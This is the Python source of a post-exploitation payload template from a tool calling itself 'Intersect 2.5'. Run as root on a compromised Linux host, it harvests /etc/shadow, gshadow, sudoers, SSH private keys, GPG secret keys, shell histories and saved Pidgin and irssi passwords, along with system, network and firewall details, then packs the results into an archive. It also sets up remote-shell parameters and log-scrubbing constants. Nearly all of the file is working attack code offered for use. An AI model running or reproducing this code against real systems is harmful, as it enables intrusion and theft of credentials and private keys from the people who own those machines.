#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
        option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
        pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir


def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)
    sys.exit()

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
        if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def copy2temp(filename, subdir=""):
    if os.path.exists(filename) is True: 
        pass
        if subdir == "" is True:
            shutil.copy2(filename, Temp_Dir)
        else:
            if os.path.exists(Temp_Dir+"/"+subdir) is True:
                subdir = (Temp_Dir+"/"+subdir)
                shutil.copy2(filename, subdir)
            elif os.path.exists(subdir) is True:
                shutil.copy2(filename, subdir)
            else:
                subdir = (Temp_Dir+"/"+subdir)
                os.mkdir(subdir)
                shutil.copy2(filename, subdir)
    else:
        pass

def write2file(filename, text):
    if os.path.exists(filename) is True:
        target = open(filename, "a")
        target.write(text)
        target.close()
    else:
        pass

def writenew(filename, content):
    new = open(filename, "a")
    new.write(content)
    new.close()

def file2file(readfile, writefile):
    if os.path.exists(readfile) is True:
        readfile = open(readfile)
        if os.path.exists(writefile) is True:
            writefile = open(writefile, "a")
            for lines in readfile.readlines():
                writefile.write(lines)
            writefile.close()
            readfile.close()
        else:
            readfile.close()
    else:
        pass
			
def maketemp(subdir):
    moddir = (Temp_Dir+"/"+subdir)
    if os.path.exists(moddir) is False:
        os.mkdir(moddir)
    else:
        pass

def users():
    global userlist
    userlist = []
    passwd = open('/etc/passwd')
    for line in passwd:
        fields = line.split(':')
        uid = int(fields[2])
        if uid > 500 and uid < 32328:
            userlist.append(fields[0])

def combinefiles(newfile, filelist):
    content = ''
    for f in filelist:
        if os.path.exists(f) is True:
            content = content + '\n' + open(f).read()
            open(newfile,'wb').write(content)
        else:
            pass

def tardir(name, directory):
    tar = tarfile.open("%s.tar.gz", "w:gz" % name)
    if os.path.exists(directory) is True:
        tar.add("%s/" % directory)
        print("[+] %s added to %s.tar.gz" % (name, directory))
        tar.close()
    else:
        print("[!] Could not find directory %s " % directory)
        tar.close()

def tarlist(name, filelist):
    tar = tarfile.open("%s.tar.gz" % name, "w:gz")
    for files in filelist:
        if os.path.exists(files) is True:
            tar.add(files)
        else:
            print("[!] %s not found. Skipping.." % files)
    tar.close()

    print("[+] %s.tar.gz file created!" % name)




def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['archive', 'extras', 'osuser', 'getrepos', 'network', 'creds']
    PORT = 8888
    RHOST = ''
    RPORT = 8888
    PPORT = 8080
    PKEY = 'KXYRTUX'
def archive():
    '''
    @description: Creates a tar archive of any files located within the Intersect sessions temporary directory
    @short: create tar archive of sessions temp directory 
    @author: ohdae [bindshell@live.com]
    '''

    os.chdir(Temp_Dir)
    temp_files = os.listdir(Temp_Dir)
    tarlist("reports", temp_files)


def extras():
    '''
    @description: Searches for system, service and app configurations. Also tries to locate certain installed apps and protection measures.
    @author: ohdae [bindshell@live.com]
    @short: finds configs, security measures and misc apps
    '''
    maketemp("extras")
    protectiondir = (Temp_Dir+"/extras")
    os.chdir(protectiondir)
    os.mkdir(Config_Dir)


    configs = [ "/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf",
                "/etc/bitlbee/bitlbee.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf",
                "/etc/security/access.conf", "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/apt/secring.gpg",
                "/etc/apt/trusted.gpg", "/etc/nginx/nginx.conf", "/etc/shells", "/etc/gated.conf", "/etc/inetd.conf", "/etc/rpc",
                "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf"
                "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf", "/opt/lampp/etc/httpd.conf", "/etc/cups/cups.conf",
                "/etc/exports", "/etc/fstab", "~/.msf4/history", "/etc/ssl/openssl.cnf" ]


    for x in configs:
        copy2temp(x, "configs")

    print("[+] Searching for protection and misc extras....")
    program = [ "truecrypt", "bulldog", "ufw", "iptables", "logrotate", "logwatch", 
                "chkrootkit", "clamav", "snort", "tiger", "firestarter", "avast", "lynis",
                "rkhunter", "perl", "tcpdump", "nc", "webmin", "python", "gcc", "jailkit", 
                "pwgen", "proxychains", "bastille", "wireshark", "nagios", "nmap", "firefox",
                "nagios", "tor", "openvpn", "virtualbox", "magictree", "apparmor", "git",
                "xen", "svn", "redmine", "ldap", "msfconsole" ]

    for x in program:
        location = whereis(x)
        if location is not None:
            text = location + '\n'
            writenew("FullList.txt", text)
               
    users()

    for user in userlist:
        if os.path.exists("/home/%s/.msf4/" % user) is True:
            os.system("ls -l /home/%s/.msf/loot > MSFLoot-%s.txt" % (user, user))
        if os.geteuid() == 0:
            if os.path.exists("/root/.msf4/") is True:
                os.system("ls -l /root/.msf4/loot > MSFLoot-root.txt")



def osuser():
    '''
    @description: Enumerate Linux distro, kernel, installed apps and services, printers, cronjobs, user lists and history files, CPU and memory info, etc.
    @author: ohdae [bindshell@live.com]
    @short: enumerate user and system information
    '''
    print("[+] Collecting operating system and user information....")
    maketemp("osinfo")
    os.chdir(Temp_Dir+"/osinfo/")
   
    proc = Popen('ps aux',
                 shell=True, 
                 stdout=PIPE,
                 )
    output = proc.communicate()[0]
    for items in output:
        writenew("ps_aux.txt", items)

    os.system("ls -alh /usr/bin > bin.txt")
    os.system("ls -alh /usr/sbin > sbin.txt")
    os.system("ls -al /etc/cron* > cronjobs.txt")
    os.system("ls -alhtr /media > media.txt")
    os.system("/usr/bin/lpstat -v > printers.txt")

    if distro == "ubuntu" or distro2 == "Ubuntu":
        os.system("dpkg -l > dpkg_list.txt")
    elif distro == "arch" or distro2 == "Arch":
        os.system("pacman -Q > pacman_list.txt")
    elif distro == "slackware" or distro2 == "Slackware":
        os.system("ls /var/log/packages > packages_list.txt")
    elif distro == "gentoo" or distro2 == "Gentoo":
        os.system("cat /var/lib/portage/world > packages.txt")
    elif distro == "centos" or distro2 == "CentOS":
        os.system("yum list installed > yum_list.txt")
    elif distro == "red hat" or distro2 == "Red Hat":
        os.system("rpm -qa > rpm_list.txt")
    else:
       pass
   
    if distro == "arch":
        os.system("egrep '^DAEMONS' /etc/rc.conf > services_list.txt")
    elif distro == "slackware":
        os.system("ls -F /etc/rc.d | grep \'*$\' > services_list.txt")
    elif whereis('chkconfig') is not None:
        os.system("chkconfig -A > services_list.txt")

    os.system("mount -l > mount.txt")
    os.system("cat /etc/sysctl.conf > sysctl.txt")
    os.system("find /var/log -type f -exec ls -la {} \; > loglist.txt")
    os.system("uname -a > distro_kernel.txt")
    os.system("df -hT > filesystem.txt")
    os.system("free -lt > memory.txt")
    os.system("locate sql | grep [.]sql$ > SQL_locations.txt")
    os.system("find /home -type f -iname '.*history' > HistoryList.txt")
    os.system("cat /proc/cpuinfo > cpuinfo.txt")
    os.system("cat /proc/meminfo > meminfo.txt")

    copy2temp(Home_Dir+"/.bash_history")
    copy2temp(Home_Dir+"/.viminfo")
    copy2temp(Home_Dir+"/.mysql_history")
   
    sysfiles = ["distro_kernel.txt","filesystem.txt","memory.txt","cpuinfo.txt","meminfo.txt"]
    combinefiles("SysInfo.txt", sysfiles)
   
    maketemp("osinfo/users")
    os.chdir("users/")
   
    os.system("ls -alhR ~/ > CurrentUser.txt")
    os.system("ls -alhR /home > AllUsers.txt")
    if os.path.exists(Home_Dir+"/.mozilla/") is True:
        os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")

   

def getrepos():
    '''
    @description: Tries to find various source code repositories and management tools. Git, SVN.
    @author: ohdae [bindshell@live.com]
    @short: search for source code repos
    '''
    os.mkdir(Temp_Dir+"/repos")
    repodir = (Temp_Dir+"/repos")
    os.chdir(repodir)

    users()

    if whereis('git') is not None:
        for user in userlist:
            if os.path.exists("/home/%s" % user) is True:
                os.system("find /home/%s -name *.git > %sRepos.txt" % (user, user))
                proc = Popen('cat /home/%s/.gitconfig' % user,
                                                   shell=True,
                                                   stdout=PIPE,
                                                   )
                userinfo = proc.communicate()[0]
        
            if os.geteuid() == 0:
                os.system("find /root -name *.git > RootRepos.txt")
                proc = Popen('cat /root/.gitconfig',
                                       shell = True,
                                       stdout=PIPE,
                                       )

                output = proc.communicate()[0]
                writenew("GitConfigs.txt", output + userinfo)    

    if whereis('svn') is not None:
        for user in userlist:
            if os.path.exists("/home/%s" % user) is True:
                os.system("/usr/bin/find /home/%s -name *.svn > SvnRepos.txt" % user)

def network():
    '''
    @description: collects network information such as listening ports, DNS info, active connections, firewall rules, etc
    @author: ohdae [bindshell@live.com]
    @short: enumerate network info
    '''
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    maketemp("network")
    networkdir = Temp_Dir+"/network"
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    combinefiles("Connections.txt", ports)
    os.system("rm nstat.txt lsof.txt")

    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        text = ("External IP Address: " + externalIP + "\nInternal IP Address: " + localIP + "\nInternal IP Range: " + IPRange)
        writenew("IPAddresses.txt", text)
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    combinefiles("NetworkInfo.txt", netfiles)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        copy2temp(x, networkdir)
   


def creds():
    '''
    @description: Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
    @author: ohdae [bindshell@live.com]
    @short: enumerate user and system credentials
    '''
    print("[+] Collecting user and system credentials....")
    maketemp("credentials")
    os.chdir(Temp_Dir+"/credentials/")
    
    os.system('getent passwd > passwd.txt')
    os.system('getent shadow > shadow.txt')
    os.system("lastlog > lastlog.txt")
    os.system("last -a > last.txt")
    os.system("getent aliases > mail_aliases.txt")

    
    os.system("find / -maxdepth 3 -name .ssh > ssh_locations.txt")
    os.system("ls /home/*/.ssh/* > ssh_contents.txt")   
    sshfiles = ["ssh_locations.txt","ssh_contents.txt"]
    combinefiles("SSH_Locations.txt", sshfiles)
    os.system("rm ssh_locations.txt ssh_contents.txt")
    if os.path.exists(Home_Dir+"/.bash_history") is True:
        os.system("cat "+Home_Dir+"/.bash_history | grep ssh > SSH_History.txt")


    credentials = [ "/etc/master.passwd", "/etc/sudoers", "/etc/ssh/sshd_config", Home_Dir+"/.ssh/id_dsa", Home_Dir+"/.ssh/id_dsa.pub",
                    Home_Dir+"/.ssh/id_rsa", Home_Dir+"/.ssh/id_rsa.pub", Home_Dir+"/.gnupg/secring.gpg", Home_Dir+"/.ssh/authorized_keys",
                    Home_Dir+"/.ssh/known_hosts", "/etc/gshadow", "/etc/ca-certificates.conf", "/etc/passwd" ]
    for x in credentials:
        copy2temp(x, "credentials")


	users()
    if whereis('pidgin') is not None:
        for user in userlist:
            if os.path.exists("/home/"+user+"/.purple/accounts.xml") is True:
                accts = open("/home/"+user+"/.purple/accounts.xml")
                saved = open("Pidgin.txt", "a")
                for line in accts.readlines():
                    if '<protocol>' in line:
                        saved.write(line)
                    elif '<name>' in line:
                        saved.write(line)
                    elif '<password>' in line:
                        saved.write(line)
                    else:
                        pass
                    
                accts.close()
                saved.close()

    for user in userlist:
        if os.path.exists("/home/"+user+"/.irssi/config") is True:
            accts = open("/home/"+user+"/.irssi/config")
            saved = open("irssi.txt", "a")
            for line in accts.readlines():
                if "password = " in line:
                    saved.write(line)
                else:
                    pass
            accts.close()
            saved.close()

    for user in userlist:
        copy2temp("/home/"+user+"/.znc/configs/znc.conf")
           
            



def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('    -a    --archive        create tar archive of sessions temp directory ')
    print('    -e    --extras        finds configs, security measures and misc apps')
    print('    -o    --osuser        enumerate user and system information')
    print('    -g    --getrepos        search for source code repos')
    print('    -n    --network        enumerate network info')
    print('    -c    --creds        enumerate user and system credentials')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'aeognc', ['archive', 'extras', 'osuser', 'getrepos', 'network', 'creds', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-a', '--archive'):
            archive()
        elif o in ('-e', '--extras'):
            extras()
        elif o in ('-o', '--osuser'):
            osuser()
        elif o in ('-g', '--getrepos'):
            getrepos()
        elif o in ('-n', '--network'):
            network()
        elif o in ('-c', '--creds'):
            creds()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])
